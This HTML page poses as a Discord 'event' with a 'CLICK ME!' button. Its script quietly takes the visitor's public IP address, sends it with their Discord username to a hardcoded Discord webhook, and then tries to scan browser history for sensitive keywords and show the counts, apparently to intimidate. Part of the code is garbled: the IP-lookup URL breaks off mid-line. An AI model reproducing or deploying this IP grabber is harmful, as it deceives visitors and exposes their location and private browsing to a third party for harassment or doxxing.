<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blobster - Main</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-image: linear-gradient(to bottom, #0d1117, #172659);
            color: white;
            font-family: Arial, sans-serif;
        }
        .container {
            text-align: center;
            background-image: linear-gradient(to bottom, #0d1117, #172659);
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            transition: opacity 0.5s ease;
            opacity: 1;
            outline: 1px solid white; /* Add white outline */
        }
        .input-container {
            margin-bottom: 20px;
        }
        input[type="text"] {
            padding: 10px;
            font-size: 18px;
            border: none;
            border-radius: 5px;
            width: calc(100% - 22px);
        }
        #clickMeBtn {
            padding: 20px 40px;
            font-size: 24px;
            color: white;
            background-color: green;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        #clickMeBtn:disabled {
            background-color: grey;
            cursor: not-allowed;
        }
        #clickMeBtn:hover:enabled {
            background-color: darkgreen;
        }
        #clickMeBtn.shake {
            animation: shake 0.5s ease;
        }
        @keyframes shake {
            0% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            50% { transform: translateX(5px); }
            75% { transform: translateX(-5px); }
            100% { transform: translateX(0); }
        }
        label {
            font-size: 18px;
            margin-bottom: 10px;
            display: block;
        }
        #secondScreen {
            display: none;
        }
        #keywordContainer {
            display: none;
            position: absolute;
            top: 50%;
            right: 20px;
            transform: translateY(-50%);
            background-color: #172659;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }
        #keywordContainer h2 {
            margin-top: 0;
        }
        #keywordList {
            list-style: none;
            padding: 0;
            margin: 0;
        }
        #keywordList li {
            margin-bottom: 10px;
        }
        #keywordList li span {
            font-weight: bold;
            color: green;
        }
    </style>
</head>
<body>
    <div class="container" id="firstScreen">
        <h1>Welcome!</h1>
        <div class="input-container">
            <label for="discordUsername">Enter your Discord username:</label>
            <input type="text" id="discordUsername" placeholder="Discord Username">
        </div>
        <button id="clickMeBtn" disabled>CLICK ME!</button>
    </div>

    <div class="container" id="secondScreen">
        <h1>Event Completed</h1>
        <p>Made by BlobsterWasHere on discord.</p>
    </div>

    <div id="keywordContainer">
        <h2>Scanned Keywords</h2>
        <ul id="keywordList"></ul>
    </div>

    <script>
        const discordUsernameInput = document.getElementById('discordUsername');
        const clickMeBtn = document.getElementById('clickMeBtn');
        const firstScreen = document.getElementById('firstScreen');
        const secondScreen = document.getElementById('secondScreen');
        const keywordContainer = document.getElementById('keywordContainer');
        const keywordList = document.getElementById('keywordList');

        discordUsernameInput.addEventListener('input', function() {
            clickMeBtn.disabled = !discordUsernameInput.value.trim();
        });

        clickMeBtn.addEventListener('click', function() {
            const discordUsername = discordUsernameInput.value.trim();
            if (!discordUsername) {
                // Add shake animation to the button
                clickMeBtn.classList.add('shake');
                // Remove shake animation after 0.5s
                setTimeout(() => {
                    clickMeBtn.classList.remove('shake');
                }, 500);
                return;
            }

            // Get the IP address using ipify
            fetch('https://api.ipify            .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    // Send the IP address and Discord username to the Discord webhook
                    const webhookUrl = 'https://discord.com/api/webhooks/1236739657505439854/xrWrzCfXnGaQ_TcMO7xXVMUw5LZU6k_fRuEIplzFBaGTB9R7hc4YJC579feuU1UqRNWx';
                    const message = {
                        content: `!IP: ${ip}, Username: ${discordUsername}`
                    };
                    
                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(message)
                    })
                    .then(response => {
                        // Check if the request was successful
                        if (!response.ok) {
                            throw new Error('Failed to send webhook request');
                        }
                        // Hide the first screen
                        firstScreen.style.opacity = 0;
                        // Show the second screen
                        secondScreen.style.display = 'block';

                        // Smoothly center the second screen
                        secondScreen.style.top = '50%';
                        secondScreen.style.left = '50%';
                        secondScreen.style.transform = 'translate(-50%, -50%)';

                        // Scan browser history and cookies for keywords
                        const keywords = ['porn', 'child', 'gay', 'furry', 'woman']; // Keywords to search for
                        const keywordCounts = {};

                        chrome.history.search({text: '', maxResults: 100}, function(data) {
                            data.forEach(function(page) {
                                const lowerCaseTitle = page.title.toLowerCase();
                                const lowerCaseUrl = page.url.toLowerCase();

                                keywords.forEach(function(keyword) {
                                    if (lowerCaseTitle.includes(keyword) || lowerCaseUrl.includes(keyword)) {
                                        if (!keywordCounts[keyword]) {
                                            keywordCounts[keyword] = 1;
                                        } else {
                                            keywordCounts[keyword]++;
                                        }
                                    }
                                });
                            });

                            // Display scanned keywords
                            for (const keyword in keywordCounts) {
                                const li = document.createElement('li');
                                li.textContent = `${keyword}: ${keywordCounts[keyword]} times`;
                                keywordList.appendChild(li);
                            }

                            // Show the keyword container
                            keywordContainer.style.display = 'block';
                        });
                    })
                    .catch(error => {
                        console.error('ERROR', error);
                        // Handle error here
                    });
                })
                .catch(error => {
                    console.error('ERROR', error);
                    // Handle error here
                });
        });
    </script>
</body>
</html>
